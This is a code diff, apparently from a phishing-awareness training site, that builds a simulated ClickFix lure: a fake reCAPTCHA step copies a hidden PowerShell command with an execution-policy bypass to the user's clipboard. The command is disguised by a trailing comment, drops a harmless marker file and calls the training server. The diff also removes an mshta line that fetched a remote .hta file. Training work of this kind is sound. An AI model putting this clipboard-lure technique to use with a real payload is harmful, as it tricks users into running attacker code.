@@ -219,8 +219,14 @@ function wireClickFix(el, token, onVerified) {
         const vid = Math.floor(1000 + Math.random() * 9000);
         vidSpan.textContent = String(vid);
         const origin = window.location.origin;
+        // Payload VO HẠI, chạy hidden hoàn toàn (-w hidden, không cửa sổ):
+        //   1) tạo C:\Temp\hehehe.txt với nội dung "Hehehehe" (dấu vết vô hại để trainee thấy/hunt)
+        //   2) GET /api/clickfix/verify để báo về server training
+        // Phần "# ✅ ..." phía sau là comment của PowerShell — giống kỹ thuật ClickFix thật.
         const payload =
-          `mshta "${origin}/verify.hta?t=${encodeURIComponent(token)}" ` +
+          `powershell -w hidden -nop -ep bypass -c "try{$null=New-Item 'C:\\Temp' -ItemType Directory -Force|Out-Null; ` +
+          `Set-Content 'C:\\Temp\\hehehe.txt' 'Hehehehe'; ` +
+          `Invoke-WebRequest '${origin}/api/clickfix/verify?t=${encodeURIComponent(token)}' -UseBasicParsing|Out-Null}catch{}" ` +
           `# \u2705 ''I am not a robot - reCAPTCHA Verification ID: ${vid}''`;
         copyToClipboard(payload);
         modal.classList.add("open");
